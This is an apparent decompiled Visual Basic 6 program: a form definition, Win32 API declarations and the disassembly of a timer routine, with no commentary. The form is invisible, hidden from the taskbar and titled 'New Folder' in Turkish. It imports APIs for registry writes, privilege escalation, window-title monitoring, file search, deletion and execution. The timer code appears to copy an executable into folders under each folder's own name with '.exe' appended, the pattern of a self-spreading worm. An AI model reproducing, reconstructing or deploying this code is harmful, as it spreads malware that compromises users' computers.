VERSION 5.00
Begin VB.Form Form1
  Caption = "Yeni Klasör"
  ScaleMode = 1
  AutoRedraw = False
  FontTransparent = True
  BorderStyle = 0 'None
  Icon = "Form1.frx":0000
  LinkTopic = "Form1"
  MaxButton = 0   'False
  MinButton = 0   'False
  Visible = 0   'False
  ClientLeft = 17235
  ClientTop = 9795
  ClientWidth = 90
  ClientHeight = 90
  ShowInTaskbar = 0   'False
  Begin VB.Timer Timer12
    Interval = 1000
    Left = 120
    Top = 120
  End
  Begin VB.Frame Frame2
    Caption = "Frame2"
    Left = 360
    Top = 3960
    Width = 4215
    Height = 3255
    TabIndex = 4
    Begin VB.Timer Timer11
      Enabled = 0   'False
      Interval = 100
      Left = 3360
      Top = 1920
    End
    Begin VB.Timer Timer10
      Enabled = 0   'False
      Interval = 10
      Left = 3240
      Top = 1320
    End
    Begin VB.ListBox List4
      BackColor = &HE0E0E0&
      Left = 1560
      Top = 360
      Width = 1695
      Height = 1395
      TabIndex = 6
      Appearance = 0 'Flat
    End
    Begin VB.ListBox List1
      BackColor = &HE0E0E0&
      Left = 240
      Top = 360
      Width = 855
      Height = 2370
      TabIndex = 5
      List = "Form1.frx":0001346A
      ItemData = "Form1.frx":000134A2
      Appearance = 0 'Flat
    End
    Begin VB.Label Label7
      Left = 1920
      Top = 2040
      Width = 1335
      Height = 255
      TabIndex = 8
      BorderStyle = 1 'Fixed Single
    End
    Begin VB.Label Label8
      Left = 1920
      Top = 2520
      Width = 1335
      Height = 255
      TabIndex = 7
      BorderStyle = 1 'Fixed Single
    End
  End
  Begin VB.Timer Timer9
    Interval = 2000
    Left = 2760
    Top = 600
  End
  Begin VB.Timer Timer5
    Enabled = 0   'False
    Interval = 1000
    Left = 2520
    Top = 2880
  End
  Begin VB.Timer Timer2
    Enabled = 0   'False
    Interval = 10
    Left = 3120
    Top = 2400
  End
  Begin VB.Timer Timer8
    Enabled = 0   'False
    Interval = 1000
    Left = 3120
    Top = 1440
  End
  Begin VB.Frame Frame1
    Caption = "Tarih"
    Left = 240
    Top = 1920
    Width = 1935
    Height = 1335
    TabIndex = 1
    Begin VB.Timer Timer7
      Enabled = 0   'False
      Interval = 500
      Left = 120
      Top = 840
    End
    Begin VB.TextBox Text3
      Left = 600
      Top = 840
      Width = 1215
      Height = 285
      TabIndex = 3
    End
    Begin VB.TextBox Text1
      Left = 600
      Top = 360
      Width = 1215
      Height = 285
      TabIndex = 2
    End
    Begin VB.Timer Timer6
      Enabled = 0   'False
      Interval = 9000
      Left = 120
      Top = 360
    End
  End
  Begin VB.TextBox Text2
    BackColor = &HE0E0E0&
    Left = 1320
    Top = 1440
    Width = 1095
    Height = 285
    TabIndex = 0
    Appearance = 0 'Flat
  End
  Begin VB.Timer Timer4
    Enabled = 0   'False
    Interval = 5
    Left = 1560
    Top = 960
  End
  Begin VB.Timer Timer3
    Enabled = 0   'False
    Interval = 5
    Left = 1560
    Top = 600
  End
  Begin VB.Timer Timer1
    Interval = 1500
    Left = 360
    Top = 720
  End
End

Attribute VB_Name = "Form1"

'VA: 43A7EC
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
'VA: 43A7A4
Private Declare Function lstrcpy Lib "kernel32" Alias "lstrcpyA" (ByVal lpString1 As String, ByVal lpString2 As String) As Long
'VA: 43A760
Private Declare Function VerQueryValue Lib "version" Alias "VerQueryValueA" (pBlock As Any, ByVal lpSubBlock As String, ByVal lplpBuffer As Long, puLen As Long) As Long
'VA: 43A718
Private Declare Function GetFileVersionInfo Lib "version" Alias "GetFileVersionInfoA" (ByVal lptstrFilename As String, ByVal dwHandle As Long, ByVal dwLen As Long, lpData As Any) As Long
'VA: 43A6CC
Private Declare Function GetFileVersionInfoSize Lib "version" Alias "GetFileVersionInfoSizeA" (ByVal lptstrFilename As String, lpdwHandle As Long) As Long
'VA: 43A66C
Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
'VA: 43A620
Private Declare Function GetModuleFileName Lib "kernel32" Alias "GetModuleFileNameA" (ByVal hModule As Long, ByVal lpFileName As String, ByVal nSize As Long) As Long
'VA: 419468
Private Declare Function DeleteFile Lib "kernel32" Alias "DeleteFileA" (ByVal lpFileName As String) As Long
'VA: 419424
Private Declare Function RegCreateKey Lib "advapi32" Alias "RegCreateKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
'VA: 4193DC
Private Declare Sub OnudaSilloA Lib "advapi32"()
'VA: 419218
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
'VA: 4191D0
Private Declare Function RegisterClass Lib "user32" Alias "RegisterClassA" (Class As WNDCLASS) As Long
'VA: 419188
Private Declare Function CreateWindowEx Lib "user32" Alias "CreateWindowExA" (ByVal dwExStyle As Long, ByVal lpClassName As String, ByVal lpWindowName As String, ByVal dwStyle As Long, ByVal x As Long, ByVal y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hWndParent As Long, ByVal hMenu As Long, ByVal hInstance As Long, lpParam As Any) As Long
'VA: 419120
Private Declare Function GetCurrentProcess Lib "kernel32" () As Long
'VA: 4190D4
Private Declare Function OpenProcessToken Lib "advapi32" (ByVal ProcessHandle As Long, ByVal DesiredAccess As Long, TokenHandle As Long) As Long
'VA: 419084
Private Declare Function LookupPrivilegeValue Lib "advapi32" Alias "LookupPrivilegeValueA" (ByVal lpSystemName As String, ByVal lpName As String, lpLuid As LARGE_INTEGER) As Long
'VA: 419034
Private Declare Function AdjustTokenPrivileges Lib "advapi32" (ByVal TokenHandle As Long, ByVal DisableAllPrivileges As Long, NewState As TOKEN_PRIVILEGES, ByVal BufferLength As Long, PreviousState As TOKEN_PRIVILEGES, ReturnLength As Long) As Long
'VA: 418FE4
Private Declare Function RegCloseKey Lib "advapi32" (ByVal hKey As Long) As Long
'VA: 418FA0
Private Declare Function RegSetValueEx Lib "advapi32" Alias "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, lpData As Any, ByVal cbData As Long) As Long
'VA: 418F58
Private Declare Function RegOpenKeyEx Lib "advapi32" Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'VA: 418D1C
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
'VA: 418CD4
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
'VA: 418C84
Private Declare Function GetForegroundWindow Lib "user32" () As Long
'VA: 418C2C
Private Declare Function ShellExecute Lib "shell32" Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
'VA: 418BD4
Private Declare Function FindClose Lib "kernel32" (ByVal hFindFile As Long) As Long
'VA: 418B90
Private Declare Function FindNextFile Lib "kernel32" Alias "FindNextFileA" (ByVal hFindFile As Long, lpFindFileData As WIN32_FIND_DATA) As Long
'VA: 418B30
Private Declare Function FindFirstFile Lib "kernel32" Alias "FindFirstFileA" (ByVal lpFileName As String, lpFindFileData As WIN32_FIND_DATA) As Long

Private Type UDT_1_00418AC8
  bStruc(8) As Byte ' String fields: 0
End Type

Private Type UDT_2_00418AD4
  bStruc(592) As Byte ' String fields: 2
End Type


Private Sub Timer10_Timer() '443750
  push ebp
  mov ebp, esp
  sub esp, 00000014h
  push 00403896h ; ext_4010EC
  mov eax, fs:[00000000h]
  push eax
  mov fs:[00000000h], esp
  sub esp, 00000138h
  push ebx
  push esi
  push edi
  mov var_14, esp
  mov var_10, 004015D8h
  mov esi, Me
  mov eax, esi
  and eax, 00000001h
  mov var_C, eax
  and esi, FFFFFFFEh
  mov Me, esi
  xor ebx, ebx
  mov var_8, ebx
  mov ecx, [esi]
  push esi
  call [ecx+00000004h]
  mov var_2C, ebx
  mov var_3C, ebx
  mov var_4C, ebx
  mov var_5C, ebx
  mov var_60, ebx
  mov var_64, ebx
  mov var_68, ebx
  mov var_6C, ebx
  mov var_70, ebx
  mov var_74, ebx
  mov var_78, ebx
  mov var_7C, ebx
  mov var_80, ebx
  mov var_84, ebx
  mov var_88, ebx
  mov var_8C, ebx
  mov var_90, ebx
  mov var_A0, ebx
  mov var_B0, ebx
  mov var_C0, ebx
  mov var_D0, ebx
  mov var_E0, ebx
  mov var_F0, ebx
  mov var_F4, ebx
  mov var_F8, ebx
  push 00000001h
  call [00401070h]
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_84
  push eax
  mov edi, [00401078h]
  call edi
  mov var_FC, eax
  mov ecx, [eax]
  lea edx, var_F4
  push edx
  push eax
  call [ecx+000000E0h]
  fnclex
  cmp eax, ebx
  jge 0044385Ch
  push 000000E0h
  push 00418DC4h
  mov ecx, var_FC
  push ecx
  push eax
  call [00401058h]
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_88
  push eax
  call edi
  mov var_104, eax
  mov ecx, [eax]
  lea edx, var_F8
  push edx
  push eax
  call [ecx+000000D8h]
  fnclex
  cmp eax, ebx
  jge 004438A3h
  push 000000D8h
  push 00418DC4h
  mov ecx, var_104
  push ecx
  push eax
  call [00401058h]
  mov dx, var_F8
  sub dx, 0001h
  jo 00444761h
  xor eax, eax
  cmp var_F4, dx
  setz al
  neg eax
  mov var_10C, ax
  lea ecx, var_88
  push ecx
  lea edx, var_84
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  cmp var_10C, bx
  jz 00443979h
  mov eax, [esi]
  push esi
  call [eax+00000304h]
  push eax
  lea ecx, var_84
  push ecx
  call edi
  mov var_FC, eax
  mov edx, [eax]
  push FFFFFFFFh
  push eax
  call [edx+0000005Ch]
  fnclex
  cmp eax, ebx
  jge 0044392Bh
  push 0000005Ch
  push 0041925Ch
  mov ecx, var_FC
  push ecx
  push eax
  call [00401058h]
  lea ecx, var_84
  call [004011D4h]
  mov edx, [esi]
  push esi
  call [edx+00000308h]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov esi, eax
  mov ecx, [esi]
  push ebx
  push esi
  call [ecx+0000005Ch]
  fnclex
  cmp eax, ebx
  jge 00443968h
  push 0000005Ch
  push 0041925Ch
  push esi
  push eax
  call [00401058h]
  lea ecx, var_84
  call [004011D4h]
  jmp 004446A2h
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov var_FC, eax
  mov ecx, [eax]
  lea edx, var_60
  push edx
  push eax
  call [ecx+000000F8h]
  fnclex
  cmp eax, ebx
  jge 004439BDh
  push 000000F8h
  push 00418DC4h
  mov ecx, var_FC
  push ecx
  push eax
  call [00401058h]
  mov eax, var_60
  mov var_60, 00000000h
  mov var_98, eax
  mov var_A0, 00000008h
  push 00000001h
  lea edx, var_A0
  push edx
  lea eax, var_B0
  push eax
  call [004011B4h]
  mov var_D8, 00418DA4h ; "\"
  mov var_E0, 00008008h
  mov ecx, [esi]
  push esi
  call [ecx+00000318h]
  push eax
  lea edx, var_88
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_64
  push ecx
  push ebx
  call [eax+00000050h]
  fnclex
  test eax, eax
  jge 00443A35h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov edx, var_64
  push edx
  call [00401018h]
  neg eax
  sbb eax, eax
  inc eax
  neg eax
  mov var_E8, ax
  mov var_F0, 0000000Bh
  lea eax, var_B0
  push eax
  lea ecx, var_E0
  push ecx
  lea edx, var_C0
  push edx
  call [00401174h]
  push eax
  lea eax, var_F0
  push eax
  lea ecx, var_D0
  push ecx
  call [004010E4h]
  push eax
  call [00401090h]
  mov bx, ax
  lea ecx, var_64
  call [004011CCh]
  lea edx, var_88
  push edx
  lea eax, var_84
  push eax
  push 00000002h
  call [0040102Ch]
  lea ecx, var_F0
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A0
  push eax
  push 00000003h
  call [00401024h]
  add esp, 0000001Ch
  test bx, bx
  jz 00443C55h
  mov ecx, [esi]
  push esi
  call [ecx+0000030Ch]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_60
  push ecx
  push ebx
  call [eax+000000F8h]
  fnclex
  test eax, eax
  jge 00443B13h
  push 000000F8h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  mov edx, var_60
  push edx
  call [00401018h]
  sub eax, 00000001h
  jo 00444761h
  mov var_D8, eax
  mov var_E0, 00000003h
  lea edx, var_E0
  lea ecx, var_3C
  call [00401010h]
  lea ecx, var_60
  call [004011CCh]
  lea ecx, var_84
  call [004011D4h]
  mov eax, [esi]
  push esi
  call [eax+0000030Ch]
  push eax
  lea ecx, var_84
  push ecx
  call edi
  mov ebx, eax
  mov edx, [ebx]
  lea eax, var_60
  push eax
  push ebx
  call [edx+000000F8h]
  fnclex
  test eax, eax
  jge 00443B94h
  push 000000F8h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  mov ecx, [esi]
  push esi
  call [ecx+00000314h]
  push eax
  lea edx, var_88
  push edx
  call edi
  mov ebx, eax
  mov var_104, ebx
  mov eax, var_60
  mov var_60, 00000000h
  mov var_98, eax
  mov var_A0, 00000008h
  lea eax, var_3C
  push eax
  call [00401170h]
  push eax
  lea ecx, var_A0
  push ecx
  lea edx, var_B0
  push edx
  call [004011A4h]
  mov ebx, [ebx]
  lea eax, var_B0
  push eax
  lea ecx, var_64
  push ecx
  call [00401118h]
  push eax
  mov edx, ebx
  mov ebx, var_104
  push ebx
  call [edx+00000054h]
  fnclex
  test eax, eax
  jge 00443C1Dh
  push 00000054h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_64
  call [004011CCh]
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  push 00000002h
  call [0040102Ch]
  lea edx, var_B0
  push edx
  lea eax, var_A0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 00000018h
  mov ecx, [esi]
  push esi
  call [ecx+00000314h]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_60
  push ecx
  push ebx
  call [eax+00000050h]
  fnclex
  test eax, eax
  jge 00443C89h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov eax, var_60
  mov var_60, 00000000h
  mov var_98, eax
  mov var_A0, 00000008h
  push 00000001h
  lea edx, var_A0
  push edx
  lea eax, var_B0
  push eax
  call [004011B4h]
  lea edx, var_B0
  lea ecx, var_5C
  call [00401010h]
  lea ecx, var_84
  call [004011D4h]
  lea ecx, var_A0
  call [00401014h]
  mov ecx, [esi]
  push esi
  call [ecx+00000314h]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_60
  push ecx
  push ebx
  call [eax+00000050h]
  fnclex
  test eax, eax
  jge 00443D14h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov edx, var_60
  push edx
  call [00401018h]
  sub eax, 00000001h
  jo 00444761h
  mov var_D8, eax
  mov var_E0, 00000003h
  lea edx, var_E0
  lea ecx, var_2C
  call [00401010h]
  lea ecx, var_60
  call [004011CCh]
  lea ecx, var_84
  call [004011D4h]
  mov var_D8, 00418DA4h ; "\"
  mov var_E0, 00008008h
  lea eax, var_5C
  push eax
  lea ecx, var_E0
  push ecx
  call [004010B8h]
  test ax, ax
  jz 00444399h
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov ebx, eax
  mov ecx, [ebx]
  lea edx, var_60
  push edx
  push ebx
  call [ecx+000000F8h]
  fnclex
  test eax, eax
  jge 00443DC3h
  push 000000F8h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  mov eax, [esi]
  push esi
  call [eax+00000318h]
  push eax
  lea ecx, var_88
  push ecx
  call edi
  mov ebx, eax
  mov edx, [ebx]
  lea eax, var_64
  push eax
  push ebx
  call [edx+00000050h]
  fnclex
  test eax, eax
  jge 00443DF7h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov ecx, var_60
  push ecx
  mov edx, var_64
  push edx
  mov ebx, [00401044h]
  call ebx
  mov edx, eax
  lea ecx, var_68
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call ebx
  mov var_98, eax
  mov var_A0, 00000008h
  push 00000000h
  lea eax, var_A0
  push eax
  call [00401120h]
  mov edx, eax
  lea ecx, var_6C
  call [004011ACh]
  push eax
  push 00418DE4h
  call [004010B0h]
  neg eax
  sbb eax, eax
  neg eax
  neg eax
  mov var_E8, ax
  mov var_F0, 0000000Bh
  mov var_D8, 00000000h
  mov var_E0, 0000800Bh
  lea ecx, var_F0
  push ecx
  lea edx, var_4C
  push edx
  lea eax, var_E0
  push eax
  lea ecx, var_B0
  push ecx
  call [00401174h]
  push eax
  lea edx, var_C0
  push edx
  call [004010E4h]
  push eax
  call [00401090h]
  mov var_10C, ax
  lea eax, var_6C
  push eax
  lea ecx, var_68
  push ecx
  lea edx, var_64
  push edx
  lea eax, var_60
  push eax
  push 00000004h
  call [00401150h]
  lea ecx, var_88
  push ecx
  lea edx, var_84
  push edx
  push 00000002h
  call [0040102Ch]
  lea eax, var_F0
  push eax
  lea ecx, var_A0
  push ecx
  push 00000002h
  call [00401024h]
  add esp, 0000002Ch
  cmp var_10C, 0000h
  jz 0044403Ah
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_88
  push eax
  call edi
  mov var_104, eax
  mov ecx, [esi]
  push esi
  call [ecx+0000030Ch]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_F4
  push ecx
  push ebx
  call [eax+000000E0h]
  fnclex
  test eax, eax
  jge 00443F63h
  push 000000E0h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  mov ebx, var_104
  mov edx, [ebx]
  mov ax, var_F4
  add ax, 0001h
  jo 00444761h
  push eax
  push ebx
  call [edx+000000E4h]
  fnclex
  test eax, eax
  jge 00443F9Ch
  push 000000E4h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_88
  push ecx
  lea edx, var_84
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov eax, [esi]
  push esi
  call [eax+00000318h]
  push eax
  lea ecx, var_84
  push ecx
  call edi
  mov ebx, eax
  mov edx, [ebx]
  push 00418DE4h
  push ebx
  call [edx+00000054h]
  fnclex
  test eax, eax
  jge 00443FEAh
  push 00000054h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_84
  mov ebx, [004011D4h]
  call ebx
  mov eax, [esi]
  push esi
  call [eax+00000314h]
  push eax
  lea ecx, var_84
  push ecx
  call edi
  mov esi, eax
  mov edx, [esi]
  push 00418DE4h
  push esi
  call [edx+00000054h]
  fnclex
  test eax, eax
  jge 0044402Dh
  push 00000054h
  push 00419844h
  push esi
  push eax
  call [00401058h]
  lea ecx, var_84
  call ebx
  jmp 004446A2h
  mov eax, [00460558h]
  test eax, eax
  jnz 00444053h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov eax, [00460558h]
  mov var_FC, eax
  mov ecx, [eax]
  lea edx, var_84
  push edx
  push eax
  call [ecx+00000014h]
  fnclex
  test eax, eax
  jge 00444086h
  push 00000014h
  push 00418ED0h
  mov ecx, var_FC
  push ecx
  push eax
  call [00401058h]
  mov eax, var_84
  mov var_104, eax
  mov edx, [eax]
  lea ecx, var_60
  push ecx
  push eax
  call [edx+00000050h]
  fnclex
  test eax, eax
  jge 004440B7h
  push 00000050h
  push 00418EF0h
  mov edx, var_104
  push edx
  push eax
  call [00401058h]
  mov eax, [00460558h]
  test eax, eax
  jnz 004440D0h
  push 00460558h
  push 00418EE0h
  call [00401134h]
  mov eax, [00460558h]
  mov var_10C, eax
  mov ecx, [eax]
  lea edx, var_88
  push edx
  push eax
  call [ecx+00000014h]
  fnclex
  test eax, eax
  jge 00444103h
  push 00000014h
  push 00418ED0h
  mov ecx, var_10C
  push ecx
  push eax
  call [00401058h]
  mov eax, var_88
  mov var_114, eax
  mov edx, [eax]
  lea ecx, var_64
  push ecx
  push eax
  call [edx+00000058h]
  fnclex
  test eax, eax
  jge 00444134h
  push 00000058h
  push 00418EF0h
  mov edx, var_114
  push edx
  push eax
  call [00401058h]
  mov eax, [esi]
  push esi
  call [eax+0000030Ch]
  push eax
  lea ecx, var_8C
  push ecx
  call edi
  mov var_11C, eax
  mov edx, [eax]
  lea ecx, var_70
  push ecx
  push eax
  call [edx+000000F8h]
  fnclex
  test eax, eax
  jge 00444178h
  push 000000F8h
  push 00418DC4h
  mov edx, var_11C
  push edx
  push eax
  call [00401058h]
  mov eax, [esi]
  push esi
  call [eax+00000318h]
  push eax
  lea ecx, var_90
  push ecx
  call edi
  mov var_124, eax
  mov edx, [eax]
  lea ecx, var_74
  push ecx
  push eax
  call [edx+00000050h]
  fnclex
  test eax, eax
  jge 004441B6h
  push 00000050h
  push 00419844h
  mov edx, var_124
  push edx
  push eax
  call [00401058h]
  mov eax, var_70
  push eax
  mov ecx, var_74
  push ecx
  call ebx
  mov edx, eax
  lea ecx, var_78
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call ebx
  mov edx, eax
  lea ecx, var_80
  call [004011ACh]
  push eax
  mov edx, var_60
  push edx
  push 00418DA4h ; "\"
  call ebx
  mov edx, eax
  lea ecx, var_68
  call [004011ACh]
  push eax
  mov eax, var_64
  push eax
  call ebx
  mov edx, eax
  lea ecx, var_6C
  call [004011ACh]
  push eax
  push 004192E0h ; ".exe"
  call ebx
  mov edx, eax
  lea ecx, var_7C
  call [004011ACh]
  push eax
  call [00401158h]
  lea ecx, var_80
  push ecx
  lea edx, var_7C
  push edx
  lea eax, var_78
  push eax
  lea ecx, var_74
  push ecx
  lea edx, var_70
  push edx
  lea eax, var_6C
  push eax
  lea ecx, var_64
  push ecx
  lea edx, var_68
  push edx
  lea eax, var_60
  push eax
  push 00000009h
  call [00401150h]
  lea ecx, var_90
  push ecx
  lea edx, var_8C
  push edx
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  push 00000004h
  call [0040102Ch]
  add esp, 0000003Ch
  mov edx, [esi]
  push esi
  call [edx+00000318h]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov ebx, eax
  mov ecx, [ebx]
  push 00418DE4h
  push ebx
  call [ecx+00000054h]
  fnclex
  test eax, eax
  jge 004442A9h
  push 00000054h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_84
  call [004011D4h]
  mov edx, [esi]
  push esi
  call [edx+00000314h]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov ebx, eax
  mov ecx, [ebx]
  push 00418DE4h
  push ebx
  call [ecx+00000054h]
  fnclex
  test eax, eax
  jge 004442EAh
  push 00000054h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_84
  call [004011D4h]
  mov edx, [esi]
  push esi
  call [edx+0000030Ch]
  push eax
  lea eax, var_88
  push eax
  call edi
  mov ebx, eax
  mov ecx, [esi]
  push esi
  call [ecx+0000030Ch]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov esi, eax
  mov eax, [esi]
  lea ecx, var_F4
  push ecx
  push esi
  call [eax+000000E0h]
  fnclex
  test eax, eax
  jge 00444348h
  push 000000E0h
  push 00418DC4h
  push esi
  push eax
  call [00401058h]
  mov edx, [ebx]
  mov ax, var_F4
  add ax, 0001h
  jo 00444761h
  push eax
  push ebx
  call [edx+000000E4h]
  fnclex
  test eax, eax
  jge 0044437Bh
  push 000000E4h
  push 00418DC4h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_88
  push ecx
  lea edx, var_84
  push edx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  jmp 004446A2h
  mov eax, [esi]
  push esi
  call [eax+00000318h]
  push eax
  lea ecx, var_88
  push ecx
  call edi
  mov var_104, eax
  mov edx, [esi]
  push esi
  call [edx+00000318h]
  push eax
  lea eax, var_84
  push eax
  call edi
  mov ebx, eax
  mov ecx, [ebx]
  lea edx, var_60
  push edx
  push ebx
  call [ecx+00000050h]
  fnclex
  test eax, eax
  jge 004443E6h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov eax, var_60
  mov var_60, 00000000h
  mov var_98, eax
  mov var_A0, 00000008h
  mov eax, var_104
  mov ebx, [eax]
  lea ecx, var_5C
  push ecx
  lea edx, var_A0
  push edx
  lea eax, var_B0
  push eax
  call [00401180h]
  push eax
  lea ecx, var_64
  push ecx
  call [00401118h]
  push eax
  mov edx, ebx
  mov ebx, var_104
  push ebx
  call [edx+00000054h]
  fnclex
  test eax, eax
  jge 0044444Dh
  push 00000054h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  lea ecx, var_64
  call [004011CCh]
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  push 00000002h
  call [0040102Ch]
  lea edx, var_B0
  push edx
  lea eax, var_A0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 00000018h
  mov ecx, [esi]
  push esi
  call [ecx+00000314h]
  push eax
  lea edx, var_84
  push edx
  call edi
  mov ebx, eax
  mov eax, [ebx]
  lea ecx, var_60
  push ecx
  push ebx
  call [eax+00000050h]
  fnclex
  test eax, eax
  jge 004444B9h
  push 00000050h
  push 00419844h
  push ebx
  push eax
  call [00401058h]
  mov edx, [esi]
  push esi
  call [edx+00000314h]
  push eax
  lea eax, var_88
  push eax
  call edi
  mov esi, eax
  mov eax, var_60
  mov var_60, 00000000h
  mov var_98, eax
  mov var_A0, 00000008h
  lea ecx, var_2C
  push ecx
  call [00401170h]
  push eax
  lea edx, var_A0
  push edx
  lea eax, var_B0
  push eax
  call [004011A4h]
  mov edi, [esi]
  lea ecx, var_B0
  push ecx
  lea edx, var_64
  push edx
  call [00401118h]
  push eax
  push esi
  call [edi+00000054h]
  fnclex
  test eax, eax
  jge 00444534h
  push 00000054h
  push 00419844h
  push esi
  push eax
  call [00401058h]
  lea ecx, var_64
  call [004011CCh]
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  push 00000002h
  call [0040102Ch]
  lea edx, var_B0
  push edx
  lea eax, var_A0
  push eax
  push 00000002h
  call [00401024h]
  add esp, 00000018h
  jmp 004446A2h
  mov esi, Me
  mov ecx, [esi]
  push esi
  call [ecx+0000030Ch]
  push eax
  lea edx, var_88
  push edx
  mov ebx, [00401078h]
  call ebx
  mov var_104, eax
  mov eax, [esi]
  push esi
  call [eax+0000030Ch]
  push eax
  lea ecx, var_84
  push ecx
  call ebx
  mov edi, eax
  mov edx, [edi]
  lea eax, var_F4
  push eax
  push edi
  call [edx+000000E0h]
  fnclex
  test eax, eax
  jge 004445D0h
  push 000000E0h
  push 00418DC4h
  push edi
  push eax
  call [00401058h]
  mov edi, var_104
  mov ecx, [edi]
  mov dx, var_F4
  add dx, 0001h
  jo 00444761h
  push edx
  push edi
  call [ecx+000000E4h]
  fnclex
  test eax, eax
  jge 00444609h
  push 000000E4h
  push 00418DC4h
  push edi
  push eax
  call [00401058h]
  lea eax, var_88
  push eax
  lea ecx, var_84
  push ecx
  push 00000002h
  call [0040102Ch]
  add esp, 0000000Ch
  mov edx, [esi]
  push esi
  call [edx+00000314h]
  push eax
  lea eax, var_84
  push eax
  call ebx
  mov edi, eax
  mov ecx, [edi]
  push 00418DE4h
  push edi
  call [ecx+00000054h]
  fnclex
  test eax, eax
  jge 00444657h
  push 00000054h
  push 00419844h
  push edi
  push eax
  call [00401058h]
  lea ecx, var_84
  mov edi, [004011D4h]
  call edi
  mov edx, [esi]
  push esi
  call [edx+00000318h]
  push eax
  lea eax, var_84
  push eax
  call ebx
  mov esi, eax
  mov ecx, [esi]
  push 00418DE4h
  push esi
  call [ecx+00000054h]
  fnclex
  test eax, eax
  jge 0044469Ah
  push 00000054h
  push 00419844h
  push esi
  push eax
  call [00401058h]
  lea ecx, var_84
  call edi
  call [0040106Ch]
  push 00444742h
  jmp 00444727h
  lea edx, var_80
  push edx
  lea eax, var_7C
  push eax
  lea ecx, var_78
  push ecx
  lea edx, var_74
  push edx
  lea eax, var_70
  push eax
  lea ecx, var_6C
  push ecx
  lea edx, var_68
  push edx
  lea eax, var_64
  push eax
  lea ecx, var_60
  push ecx
  push 00000009h
  call [00401150h]
  lea edx, var_90
  push edx
  lea eax, var_8C
  push eax
  lea ecx, var_88
  push ecx
  lea edx, var_84
  push edx
  push 00000004h
  call [0040102Ch]
  lea eax, var_D0
  push eax
  lea ecx, var_C0
  push ecx
  lea edx, var_B0
  push edx
  lea eax, var_A0
  push eax
  push 00000004h
  call [00401024h]
  add esp, 00000050h
  ret
  lea ecx, var_2C
  mov esi, [00401014h]
  call global_00401014
  lea ecx, var_3C
  call global_00401014
  lea ecx, var_4C
  call global_00401014
  lea ecx, var_5C
  call global_00401014
  ret
  mov eax, Me
  mov ecx, [eax]
  push eax
  call [ecx+00000008h]
  mov eax, var_C
  mov ecx, var_1C
  mov fs:[00000000h], ecx
  pop edi
  pop esi
  pop ebx
  mov esp, ebp
  pop ebp
  retn 0004h
End Sub

Private Sub Form_Load() '43C220
